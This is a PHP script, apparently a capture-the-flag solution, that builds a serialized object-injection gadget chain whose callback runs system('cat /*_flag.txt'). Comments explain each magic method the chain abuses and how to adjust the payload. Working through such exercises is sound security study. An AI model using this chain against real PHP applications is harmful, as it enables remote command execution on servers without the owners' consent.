
<?php
//after you serialize it you might need to base64 encoded too, if you change the payload dont frget to change the s:16 before the payload, and in 16 put how many chars is in payload. If you need to use /, you have to do it like this /\ and do the 17, 16. (minus 1)
require_once __DIR__ . '/Models/PizzaModel.php';
require_once __DIR__ . '/Models/SpaghettiModel.php';
require_once __DIR__ . '/Models/IceCreamModel.php';
require_once __DIR__ . '/Helpers/ArrayHelpers.php';

use Helpers\ArrayHelpers;


$ArrayHelpers = new ArrayHelpers(["cat /\*_flag.txt"]);
$ArrayHelpers ->callback = 'system';

$IceCream = new IceCream();
$IceCream ->flavors = $ArrayHelpers;

$Spaghetti = new Spaghetti();
$Spaghetti->sauce = $IceCream;
$Spaghetti->waht; // triggers __get()

$Pizza = new Pizza();
$Pizza->size = $Spaghetti;

$payload = serialize($Pizza);
echo "Your payload:\n";
echo $payload . "\n";

// So you found a website that uses php files and inside them you find: four classes contain magic methods that are executed implicitly by the engine in specific circumstances (__destruct, __get, __invoke, and ArrayIterator::current() via iteration). 
// Those magic-method behaviors are the usual building blocks for a PHP object-injection gadget chain.

//1. __destruct()
// A magic method called automatically when an object is destroyed (goes out of scope or script ends).
// Use: Cleanup tasks, releasing resources, or performing final actions before the object is removed.
// Example:
//class Logger {
//   public function __destruct() {
//        echo "Closing log file\n";
//    }
//}
// In your code: Pizza class has a __destruct() that echoes $this->size->what. So when a Pizza object is destroyed, it tries to access the what property of $size (which is a Spaghetti object).


//2. __get($name)
// Magic method called when you try to access a non-existent or inaccessible property of an object.
// Use: To customize dynamic property retrieval or implement lazy loading.
//Example:
//class User {
//   private $data = ['name' => 'Alice'];
//    public function __get($key) {
//       return $this->data[$key] ?? null;
//    }
//}
//In your code: Spaghetti::__get($tomato) is called when trying to access undefined properties, and it calls $this->sauce as a function (since $this->sauce is an object with __invoke()).


//3. __invoke()
// Magic method called when an object is used like a function, e.g., $obj().
// Use: Makes objects callable, useful for callbacks or functors.
// Example:
//class Greeter {
//    public function __invoke($name) {
//        echo "Hello, $name!";
//    }
//}
//$greet = new Greeter();
//$greet("World"); // Calls __invoke
//In your code: IceCream::__invoke() loops through $flavors and echoes each flavor. This means IceCream objects can be called as functions to print their flavors.

//4. ArrayIterator::current()
// A method from PHP’s built-in ArrayIterator class that returns the current element in the iteration.
// Use: To iterate over arrays/objects and optionally override behavior during iteration.
//In your code: ArrayHelpers extends ArrayIterator and overrides current() to:
//Get the current value
//Call a callback function on that value (side effect)
//Return the value
//This allows injecting custom behavior when iterating over $flavors.
